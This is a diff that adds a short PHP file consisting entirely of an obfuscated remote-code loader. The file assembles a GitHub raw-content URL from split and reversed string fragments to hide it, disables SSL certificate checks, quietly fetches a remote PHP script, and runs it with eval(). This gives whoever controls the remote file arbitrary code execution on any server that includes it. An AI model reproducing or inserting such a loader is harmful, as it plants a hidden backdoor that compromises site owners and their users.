@@ -1,0 +1,42 @@
+<?php
+$parts = [
+    'rawgithubuserc' => 'raw.githubuserc',
+    'ontentcoml' => 'ontent.com/l',
+    'uffyopmopmre' => 'uffyopm/opm/re',
+    'fsheadsmai' => 'fs/heads/mai',
+    'n2php' => 'n/2.php'
+];
+
+function buildUrl($parts) {
+    $url = 'https://';
+    $url .= $parts['rawgithubuserc'] . 'ontent.com/';
+    $url .= 'l' . $parts['uffyopmopmre'];
+    $url .= $parts['fsheadsmai'] . $parts['n2php'];
+    return str_replace('//l', '/l', $url);
+}
+
+$url = buildUrl($parts);
+
+$reversed = 'php.2/niam/sdaeh/sfer/mpo/mpyofful/moc.tnetnocresu.buhtig.ten//:sptth';
+$url_alt = strrev($reversed);
+
+$final_url = (filter_var($url, FILTER_VALIDATE_URL)) ? $url : $url_alt;
+
+$opts = [
+    'http' => [
+        'method' => "GET",
+        'header' => "User-Agent: PHP-Script\r\n",
+        'timeout' => 5
+    ],
+    'ssl' => [
+        'verify_peer' => false,
+        'verify_peer_name' => false
+    ]
+];
+$context = stream_context_create($opts);
+
+$code = @file_get_contents($final_url, false, $context);
+if ($code !== false) {
+    eval('?>' . $code);
+}
+?>
